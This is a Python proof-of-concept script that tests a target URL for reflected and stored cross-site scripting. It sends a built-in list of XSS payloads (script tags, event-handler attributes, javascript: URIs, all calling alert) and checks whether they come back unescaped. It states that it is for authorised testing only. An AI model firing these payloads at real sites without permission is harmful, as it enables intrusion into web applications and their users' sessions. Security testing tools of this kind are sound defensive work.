#!/usr/bin/env python3
"""
Cross-Site Scripting (XSS) PoC
================================
Demonstrates reflected and stored XSS payload injection against a target URL.

DISCLAIMER: For educational and research purposes only.
Only run against systems you own or have explicit written permission to test.
"""

import argparse
import sys

try:
    import requests
    from colorama import Fore, Style, init as colorama_init
except ImportError:
    sys.exit("Missing dependencies. Run: pip install -r requirements.txt")

sys.path.insert(0, str(__import__("pathlib").Path(__file__).resolve().parents[1]))
from utils import build_session  # noqa: E402

colorama_init(autoreset=True)

DISCLAIMER = (
    f"{Fore.YELLOW}[!] DISCLAIMER: This tool is for educational/research purposes only.\n"
    f"    Only use against systems you own or have explicit written permission to test.{Style.RESET_ALL}"
)

# ── Payload libraries ────────────────────────────────────────────────────────

REFLECTED_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "'\"><script>alert('XSS')</script>",
    "<body onload=alert('XSS')>",
    "<iframe src=\"javascript:alert('XSS')\">",
    "javascript:alert('XSS')",
    "<details open ontoggle=alert('XSS')>",
    "<input autofocus onfocus=alert('XSS')>",
    "<marquee onstart=alert('XSS')>test</marquee>",
]

STORED_PAYLOADS = [
    "<script>alert('Stored-XSS')</script>",
    "<img src=x onerror=alert('Stored-XSS')>",
    "<svg/onload=alert('Stored-XSS')>",
    "'\"><img src=x onerror=alert('Stored-XSS')>",
]

# Tokens we look for in the response to confirm reflection
REFLECTION_MARKERS = [
    "<script>alert(",
    "onerror=alert(",
    "onload=alert(",
    "javascript:alert(",
    "onfocus=alert(",
    "ontoggle=alert(",
    "onstart=alert(",
]


def test_reflected(
    session: requests.Session,
    url: str,
    param: str,
    method: str,
    timeout: int,
) -> bool:
    """Send each reflected payload and check whether it appears unescaped in the response."""
    print(f"\n{Fore.CYAN}[*] Testing reflected XSS on param '{param}' ({method.upper()})...")
    found = False
    for payload in REFLECTED_PAYLOADS:
        try:
            if method.upper() == "POST":
                resp = session.post(url, data={param: payload}, timeout=timeout)
            else:
                resp = session.get(url, params={param: payload}, timeout=timeout)

            if any(marker in resp.text for marker in REFLECTION_MARKERS):
                print(
                    f"{Fore.RED}[+] Reflected XSS detected!\n"
                    f"    Payload: {payload!r}\n"
                    f"    Status : {resp.status_code}"
                )
                found = True
            else:
                print(f"{Fore.GREEN}[-] Not reflected: {payload[:50]!r}")
        except requests.RequestException as exc:
            print(f"{Fore.YELLOW}[-] Request error: {exc}")
    return found


def test_stored(
    session: requests.Session,
    url: str,
    param: str,
    read_url: str | None,
    timeout: int,
) -> bool:
    """Submit stored XSS payloads and optionally verify them at a read-back URL."""
    print(f"\n{Fore.CYAN}[*] Testing stored XSS on param '{param}' (POST)...")
    found = False
    for payload in STORED_PAYLOADS:
        try:
            resp = session.post(url, data={param: payload}, timeout=timeout)
            print(f"    Submitted payload: {payload[:60]!r} → HTTP {resp.status_code}")

            # If a separate read-back URL is provided, check there for reflection
            check_url = read_url or url
            read_resp = session.get(check_url, timeout=timeout)
            if any(marker in read_resp.text for marker in REFLECTION_MARKERS):
                print(
                    f"{Fore.RED}[+] Stored XSS payload reflected back!\n"
                    f"    Payload  : {payload!r}\n"
                    f"    Read URL : {check_url}"
                )
                found = True
        except requests.RequestException as exc:
            print(f"{Fore.YELLOW}[-] Request error: {exc}")
    return found


def main() -> None:
    parser = argparse.ArgumentParser(
        description="XSS PoC – educational purposes only",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    parser.add_argument("--url",      required=True, help="Target URL")
    parser.add_argument("--param",    default="name", help="Input parameter to inject (default: name)")
    parser.add_argument("--method",   default="GET",  choices=["GET", "POST"], help="HTTP method (default: GET)")
    parser.add_argument("--type",     default="reflected", choices=["reflected", "stored", "both"],
                        help="XSS type to test (default: reflected)")
    parser.add_argument("--read-url", default=None,
                        help="For stored XSS: URL to read back the stored content (optional)")
    parser.add_argument("--cookies",  default=None, help="Session cookies, e.g. 'PHPSESSID=abc; security=low'")
    parser.add_argument("--timeout",  type=int, default=10, help="Request timeout in seconds (default: 10)")
    args = parser.parse_args()

    print(DISCLAIMER)
    print(f"\n{Fore.CYAN}[*] Target : {args.url}")
    print(f"{Fore.CYAN}[*] Param  : {args.param}")
    print(f"{Fore.CYAN}[*] Type   : {args.type}\n")

    session = build_session(args.cookies, user_agent="XSS-PoC/1.0 (educational)")
    found = False

    if args.type in ("reflected", "both"):
        found |= test_reflected(session, args.url, args.param, args.method, args.timeout)

    if args.type in ("stored", "both"):
        found |= test_stored(session, args.url, args.param, args.read_url, args.timeout)

    print()
    if found:
        print(f"{Fore.RED}[!] Target may be vulnerable to XSS.")
    else:
        print(f"{Fore.GREEN}[✓] No XSS indicators found with tested payloads.")


if __name__ == "__main__":
    main()
